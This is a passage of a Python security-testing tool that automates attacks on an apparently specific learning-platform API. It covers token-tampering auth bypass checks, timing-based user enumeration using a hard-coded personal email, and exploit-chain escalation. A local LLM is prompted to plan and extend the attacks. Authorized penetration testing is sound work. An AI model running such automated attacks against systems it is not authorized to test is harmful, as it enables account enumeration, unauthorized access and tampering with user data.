            resp = _req.post(f"{session.base_url}/learner-list/",
                             json={}, cookies={"cf_at": tampered, "cf_rt": cf_rt},
                             verify=False, timeout=10)
            if resp.status_code == 200:
                f = {"type": "refresh_token_bypass", "severity": HIGH,
                     "detail": "Invalid access token + valid refresh token = authenticated (silent re-auth)",
                     "url": f"{session.base_url}/learner-list/",
                     "evidence": f"Tampered cf_at + valid cf_rt → HTTP {resp.status_code}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)

        log("ok", f"  {len(findings)} token security findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 11: TIMING ORACLES
# ═══════════════════════════════════════════════════════════════════════════════

class TimingOracle:
    """Detect user enumeration via response timing."""

    def run(self, session: AuthSession, saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 11: Timing Oracle Testing")
        findings = []
        import requests as _req

        # Test password reset timing
        base = session.base_url.replace("/api/organization", "/api/learner")
        valid_times = []
        invalid_times = []

        for email in ["test@test.com", "mahesh.kumar@cyberfrat.com"]:
            start = time.monotonic()
            try:
                _req.post(f"{base}/reset-password-request/",
                          data={"email": email}, verify=False, timeout=15)
            except Exception:
                pass
            valid_times.append(time.monotonic() - start)

        for email in ["nonexistent_xyz@fake.com", "definitely_not_real@test.com"]:
            start = time.monotonic()
            try:
                _req.post(f"{base}/reset-password-request/",
                          data={"email": email}, verify=False, timeout=15)
            except Exception:
                pass
            invalid_times.append(time.monotonic() - start)

        avg_valid = sum(valid_times) / len(valid_times) if valid_times else 0
        avg_invalid = sum(invalid_times) / len(invalid_times) if invalid_times else 0

        if avg_valid > 0 and avg_invalid > 0 and avg_valid / max(avg_invalid, 0.01) > 5:
            f = {"type": "timing_oracle_user_enum", "severity": MEDIUM,
                 "detail": f"User enumeration via reset-password timing: valid={avg_valid:.1f}s vs invalid={avg_invalid:.1f}s",
                 "url": f"{base}/reset-password-request/",
                 "evidence": f"Valid email: {avg_valid:.1f}s, Invalid: {avg_invalid:.1f}s ({avg_valid/max(avg_invalid,0.01):.0f}x difference)"}
            findings.append(f)
            if saver:
                saver.save(f)
                saver.save_txt(f)

        log("ok", f"  {len(findings)} timing oracle findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 12: CHAIN BUILDER
# ═══════════════════════════════════════════════════════════════════════════════

class ChainBuilder:
    """Cross-reference findings for exploit chain escalation."""

    CHAINS = [
        (["idor", "privilege_escalation"], CRITICAL, "IDOR + Priv Esc = Full data breach"),
        (["upload_bypass", "arbitrary_upload"], CRITICAL, "Upload bypass + S3 = Stored XSS/Phishing"),
        (["db_schema_leak", "sqli"], CRITICAL, "Schema leak + SQLi = Database compromise"),
        (["missing_rate_limit", "timing_oracle"], HIGH, "No rate limit + timing oracle = Account enumeration + brute force"),
        (["django_debug", "db_schema_leak"], HIGH, "Debug mode + DB errors = Full application internals exposed"),
        (["refresh_token_bypass", "idor"], CRITICAL, "Token bypass + IDOR = Persistent unauthorized data access"),
        (["smtp_credential_exposure", "missing_rate_limit"], HIGH, "SMTP creds + no rate limit = Phishing infrastructure"),
        (["score_manipulation", "idor"], HIGH, "Score manipulation + IDOR = Tamper any student's grades"),
    ]

    def run(self, all_findings: list[dict], saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 12: Chain Building")
        chains = []
        finding_types = {f["type"] for f in all_findings}

        for required_types, severity, description in self.CHAINS:
            if all(any(rt in ft for ft in finding_types) for rt in required_types):
                chain = {"type": "exploit_chain", "severity": severity,
                         "detail": description,
                         "url": "N/A",
                         "evidence": f"Chain: {' + '.join(required_types)}"}
                chains.append(chain)
                if saver:
                    saver.save(chain)
                    saver.save_txt(chain)
                log("vuln", f"  CHAIN: {description}")

        log("ok", f"  {len(chains)} exploit chains identified")
        return chains


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════════

def run_autopilot(base_url: str, auth_creds: str, login_url: str = "login-view/",
                  auth_creds_b: str = None, frontend_url: str = None,
                  output_dir: str = None, rate_limit: float = 5.0,
                  with_brain: bool = False) -> dict:
    """Run all 12 phases of the autonomous API VAPT."""

    print(r"""
 ██╗   ██╗██╗██╗  ██╗██████╗  █████╗ ███╗   ███╗ █████╗ ██████╗ ██╗████████╗██╗   ██╗ █████╗
 ██║   ██║██║██║ ██╔╝██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝██╔══██╗
 ██║   ██║██║█████╔╝ ██████╔╝███████║██╔████╔██║███████║██║  ██║██║   ██║    ╚████╔╝ ███████║
 ╚██╗ ██╔╝██║██╔═██╗ ██╔══██╗██╔══██║██║╚██╔╝██║██╔══██║██║  ██║██║   ██║     ╚██╔╝  ██╔══██║
  ╚████╔╝ ██║██║  ██╗██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║██████╔╝██║   ██║      ██║   ██║  ██║
   ╚═══╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝
              Brain-Supervised Autonomous API VAPT Engine
""")
    print(f"  Target : {base_url}")
    print(f"  Time   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60 + "\n")

    limiter = RateLimiter(rate_limit)
    session = AuthSession(base_url, limiter)

    # Login
    parts = auth_creds.split(":", 1)
    if len(parts) != 2:
        log("err", f"Invalid creds format (use user:pass)")
        return {}
    token = session.auto_login(login_url, parts[0], parts[1])
    if not token:
        log("err", "Login failed")
        return {}
    log("ok", f"Authenticated as {parts[0]}")

    # Second account login (for IDOR/priv esc)
    # Try org API first, then learner API (different user tables)
    token_b = None
    if auth_creds_b:
        parts_b = auth_creds_b.split(":", 1)
        if len(parts_b) == 2:
            # Try 1: same API (org)
            session_b = AuthSession(base_url, limiter)
            token_b = session_b.auto_login(login_url, parts_b[0], parts_b[1])
            if not token_b:
                # Try 2: learner API (replace /organization/ with /learner/)
                learner_base = base_url.replace("/organization", "/learner")
                session_b = AuthSession(learner_base, limiter)
                token_b = session_b.auto_login(login_url, parts_b[0], parts_b[1])
            if token_b:
                log("ok", f"Second account: {parts_b[0]} (role: learner)")
            else:
                log("warn", f"Second account login failed for {parts_b[0]}")

    # Output
    if output_dir:
        os.makedirs(output_dir, exist_ok=True)

    all_findings = []

    # Phase 1: Endpoint Discovery
    discovery = EndpointDiscovery(session, frontend_url)
    endpoints = discovery.run()

    # Save endpoints
    if output_dir:
        with open(os.path.join(output_dir, "endpoints.json"), "w") as f:
            json.dump(endpoints, f, indent=2)

    # ── Brain-Supervised Dynamic Loop ──────────────────────────────────────────
    saver = FindingSaver(output_dir, "autopilot") if output_dir else None
    ctx = BrainScanContext()
    ctx.endpoints = endpoints

    # Brain creates initial test plan (or use default order if no brain)
    ctx.test_plan = _brain_create_initial_plan(endpoints, with_brain)
    log("info", f"Test plan: {len(ctx.test_plan)} phases queued")

    # Dynamic loop: brain decides after each phase
    while ctx.test_plan and ctx.phases_executed < MAX_PHASES:
        phase_spec = ctx.test_plan.pop(0)
        phase_name = phase_spec["phase"]
        ctx.phases_executed += 1

        # Execute phase
        findings = _run_phase(phase_spec, session, token, token_b, endpoints, saver)
        ctx.all_findings.extend(findings)
        ctx.completed_phases.append(phase_name)

        # Brain supervisor decision — visible reasoning
        if with_brain and findings:
            decision = _brain_decide_next(phase_name, findings, ctx)
            action = decision.get("action", "continue")
            reason = decision.get("reason", "")

            ctx.phase_decisions.append({
                "after": phase_name, "action": action,
                "reason": reason, "findings_count": len(findings),
            })

            # Show brain's thinking to the user
            pending_names = [p["phase"] for p in ctx.test_plan[:3]]
            print(f"\033[0;35m  ┌─ Brain Supervisor ─────────────────────────────────\033[0m")
            print(f"\033[0;35m  │\033[0m Reviewed: {phase_name} ({len(findings)} findings)")
            print(f"\033[0;35m  │\033[0m Thinking: {reason[:100]}")
            print(f"\033[0;35m  │\033[0m Decision: \033[1m{action.upper()}\033[0m", end="")

            if action == "inject" and decision.get("phase"):
                new_phase = {
                    "phase": decision["phase"],
                    "endpoints": decision.get("endpoints"),
                    "priority": 10,
                    "reason": reason,
                }
                ctx.test_plan.insert(0, new_phase)
                inject_eps = decision.get("endpoints", [])
                print(f" → {decision['phase']} ({len(inject_eps)} endpoints)")
                print(f"\033[0;35m  │\033[0m Next: {decision['phase']} → {' → '.join(pending_names[:2])}")

            elif action == "skip" and decision.get("skip_phase"):
                skip_name = decision["skip_phase"]
                ctx.test_plan = [p for p in ctx.test_plan if p["phase"] != skip_name]
                print(f" → removing {skip_name} from queue")
                print(f"\033[0;35m  │\033[0m Next: {' → '.join(pending_names[:3])}")

            else:
                print(f" → next: {pending_names[0] if pending_names else 'done'}")

            print(f"\033[0;35m  └─────────────────────────────────────────────────────\033[0m", flush=True)

    if ctx.phases_executed >= MAX_PHASES:
        log("warn", f"  Safety cap: stopped after {MAX_PHASES} phases")

    # Save brain supervisor log
    if with_brain and ctx.phase_decisions and output_dir:
        log_path = os.path.join(output_dir, "brain_supervisor_log.json")
        with open(log_path, "w") as f:
            json.dump({
                "phases_executed": ctx.completed_phases,
                "decisions": ctx.phase_decisions,
                "total_findings": len(ctx.all_findings),
                "injected_phases": sum(1 for d in ctx.phase_decisions if d["action"] == "inject"),
                "skipped_phases": sum(1 for d in ctx.phase_decisions if d["action"] == "skip"),
            }, f, indent=2)
        log("info", f"  Supervisor log: {log_path}")

    all_findings = ctx.all_findings

    # Phase 12: Chain Building
    chains = ChainBuilder().run(all_findings, saver)
    all_findings.extend(chains)

    # Phase 13: Brain Validation (FP removal + severity correction)
    if with_brain:
        try:
            all_findings = _brain_validate_findings(all_findings, output_dir)
        except Exception as e:
            log("warn", f"Brain validation failed: {e}")

    # Save summary
    if saver:
        saver.save_summary()

    # Summary
    severity_counts = {}
    for f in all_findings:
        sev = f.get("severity", "unknown")
        severity_counts[sev] = severity_counts.get(sev, 0) + 1

    print("\n" + "=" * 60)
    print("  AUTOPILOT COMPLETE")
    print("=" * 60)
    print(f"  Total findings: {len(all_findings)}")
    for sev in [CRITICAL, HIGH, MEDIUM, LOW, INFO]:
        count = severity_counts.get(sev, 0)
        if count:
            print(f"    {sev.upper()}: {count}")
    print(f"  Endpoints tested: {len(endpoints)}")
    print(f"  Output: {output_dir or 'stdout only'}")
    print("=" * 60 + "\n")

    # Brain chain analysis + recommendations
    if with_brain:
        try:
            _run_brain_analysis(all_findings, output_dir)
        except Exception as e:
            log("warn", f"Brain analysis failed: {e}")

    return {"findings": all_findings, "endpoints": endpoints, "chains": chains}


# (Old _brain_supervisor_review removed — replaced by _brain_decide_next above)


def _brain_validate_findings(findings: list[dict], output_dir: str = None) -> list[dict]:
    """Use local LLM to review findings for false positives and severity inflation."""
    log("phase", "Phase 13: Brain Validation (FP + Severity Review)")
    try:
        import ollama
    except ImportError:
        log("warn", "  ollama not installed — skipping brain validation")
        return findings

    # For JSON validation, prefer non-thinking models (Gemma 4 puts output in thinking field)
    model = None
    for candidate in ["qwen3-coder-64k:latest", "vapt-qwen25:latest",
                      "qwen2.5-coder:32b", "baron-llm:latest", "qwen3:8b"]:
        try:
            ollama.show(candidate)
            model = candidate
            break
        except Exception:
            continue
    if not model:
        log("warn", "  No Ollama model found — skipping validation")
        return findings

    log("info", f"  Validation model: {model} (non-thinking for JSON)")

    summary = "\n".join(
        f"[{f['severity'].upper()}] {f['type']}: {f['detail']}"
        for f in findings
    )

    prompt = f"""Review these {len(findings)} VAPT findings. Return JSON with severity corrections.

Rules:
- S3 does NOT execute PHP/Python. Upload to S3 is NOT RCE. If CRITICAL for S3 upload, downgrade to HIGH.
- Django DEBUG=True is HIGH (CVSS 7.5), NOT CRITICAL (requires CVSS >= 9.0).
- Server version disclosure alone is INFO, not LOW/MEDIUM.
- Missing rate limiting is MEDIUM unless it directly enables account takeover.
- If a finding claims "RCE" but the file is stored on static S3, downgrade to HIGH.

Findings:
{summary}

Return ONLY this JSON format, no other text:
{{"fixes": [{{"finding_type": "type_name", "action": "downgrade", "new_severity": "high", "reason": "one line"}}]}}

If all findings are correctly rated, return: {{"fixes": []}}"""

    try:
        resp = ollama.chat(model=model, messages=[
            {"role": "system", "content": "You are a VAPT severity reviewer. Output ONLY valid JSON. No markdown fences. No explanation."},
            {"role": "user", "content": prompt},
        ], options={"num_predict": 1000, "temperature": 0.1})

        content = resp["message"].get("content", "") or ""
        thinking = resp["message"].get("thinking", "") or ""
        combined = content + " " + thinking

        # Strip markdown fences if present
        combined = re.sub(r'```json\s*', '', combined)
        combined = re.sub(r'```\s*', '', combined)

        # Extract JSON from response
        json_match = re.search(r'\{[^{}]*"fixes"\s*:\s*\[[\s\S]*?\]\s*\}', combined)
        if not json_match:
            log("warn", "  Brain returned no actionable JSON — keeping all findings")
            return findings

        review = json.loads(json_match.group(0))
        fixes = review.get("fixes", [])

        if not fixes:
            log("ok", "  Brain approved all findings — no changes needed")
            return findings

        # Apply fixes
        removed = 0
        downgraded = 0
        for fix in fixes:
            ftype = fix.get("finding_type", "")
            action = fix.get("action", "keep")
            new_sev = fix.get("new_severity", "")
            reason = fix.get("reason", "")

            for f in findings:
                if ftype and ftype in f.get("type", ""):
                    if action == "remove":
                        f["_removed"] = True
                        removed += 1
                        log("warn", f"  REMOVED: {f['type']} — {reason}")
                    elif action == "downgrade" and new_sev:
                        old_sev = f["severity"]
                        f["severity"] = new_sev
                        downgraded += 1
                        log("info", f"  DOWNGRADED: {f['type']} {old_sev}→{new_sev} — {reason}")
                    break

        # Remove marked findings
        validated = [f for f in findings if not f.get("_removed")]

        log("ok", f"  Brain review: {removed} removed, {downgraded} downgraded, {len(validated)} kept")

        # Save review log
        if output_dir:
            review_path = os.path.join(output_dir, "brain_validation.json")
            with open(review_path, "w") as fh:
                json.dump({"model": model, "fixes": fixes,
                           "removed": removed, "downgraded": downgraded,
                           "total_before": len(findings), "total_after": len(validated)}, fh, indent=2)
            log("info", f"  Review log: {review_path}")

        return validated

    except json.JSONDecodeError as e:
        log("warn", f"  Brain returned invalid JSON: {e}")
        return findings
    except Exception as e:
        log("warn", f"  Brain validation error: {e}")
        return findings


def _run_brain_analysis(findings: list[dict], output_dir: str = None):
    """Send findings to local Ollama for chain analysis."""
    log("phase", "Brain Analysis (Local LLM)")
    try:
        import ollama
        summary = "\n".join(
            f"[{f['severity'].upper()}] {f['type']}: {f['detail']}"
            for f in findings
        )
        prompt = (
            f"You are an elite penetration tester. Analyze these {len(findings)} findings "
            f"from an LMS application (Django + Keycloak + PostgreSQL + S3):\n\n"
            f"{summary}\n\n"
            f"1. What exploit chains escalate individual findings to CRITICAL?\n"
            f"2. What did the scanner likely miss?\n"
            f"3. What manual tests should the operator run next?\n"
            f"Be specific — cite finding types and chain them."
        )
        # Try models in priority order: Gemma 4 27B → vapt-qwen25 → qwen2.5:32b → qwen3:8b
        model = None
        # Tested priority order (benchmark: quality + speed):
        # qwen3-coder-64k (4/4, 10 tok/s) > vapt-qwen25 (4/4, 4 tok/s) >
        # gemma4:26b (untested) > deepseek-r1:32b (4/4, 3.9 tok/s) >
        # baron-llm (2/4, 14 tok/s) > qwen3:8b (fallback)
        for candidate in ["gemma4:26b", "qwen3-coder-64k:latest",
                          "vapt-qwen25:latest", "deepseek-r1:32b",
                          "baron-llm:latest", "qwen3:8b"]:
            try:
                ollama.show(candidate)
                model = candidate
                break
            except Exception:
                continue
        if not model:
            log("warn", "  No suitable Ollama model found")
            return
        log("info", f"  Using model: {model}")
        resp = ollama.chat(model=model, messages=[
            {"role": "system", "content": "You are a VAPT expert. Be concise and actionable."},
            {"role": "user", "content": prompt},
        ], options={"num_predict": 800, "temperature": 0.3})
        # Some models (GLM, DeepSeek-R1) put output in "thinking" field
        analysis = resp["message"].get("content", "") or resp["message"].get("thinking", "")
        log("ok", f"  Brain analysis: {len(analysis)} chars")
        if output_dir:
            with open(os.path.join(output_dir, "brain_analysis.md"), "w") as f:
                f.write(f"# Vikramaditya Brain Analysis\n\n{analysis}\n")
            log("ok", f"  Saved to {output_dir}/brain_analysis.md")
        print(analysis)
    except ImportError:
        log("warn", "  ollama package not installed — run: pip install ollama")
    except Exception as e:
        log("warn", f"  Ollama error: {e}")


def main():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    parser = argparse.ArgumentParser(
        description="Vikramaditya Autopilot API Hunt — 12-Phase Autonomous VAPT",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 autopilot_api_hunt.py --base-url https://api.example.com --auth-creds user:pass
  python3 autopilot_api_hunt.py --base-url URL --auth-creds admin:pass --auth-creds-b learner:pass
  python3 autopilot_api_hunt.py --base-url URL --auth-creds user:pass --with-brain
        """)
    parser.add_argument("--base-url", required=True, help="API base URL")
    parser.add_argument("--auth-creds", required=True, help="user:pass for primary account")
    parser.add_argument("--auth-creds-b", help="user:pass for second account (IDOR/priv esc)")
    parser.add_argument("--login-url", default="login-view/", help="Login endpoint path")
    parser.add_argument("--frontend-url", help="Frontend URL for JS bundle scraping")
    parser.add_argument("--output", help="Output directory for findings")
    parser.add_argument("--rate-limit", type=float, default=5.0, help="Max requests/sec")
    parser.add_argument("--with-brain", action="store_true", help="Use local Ollama for analysis")
    args = parser.parse_args()

    run_autopilot(
        base_url=args.base_url,
        auth_creds=args.auth_creds,
        auth_creds_b=args.auth_creds_b,
        login_url=args.login_url,
        frontend_url=args.frontend_url,
        output_dir=args.output,
        rate_limit=args.rate_limit,
        with_brain=args.with_brain,
    )


if __name__ == "__main__":
    main()
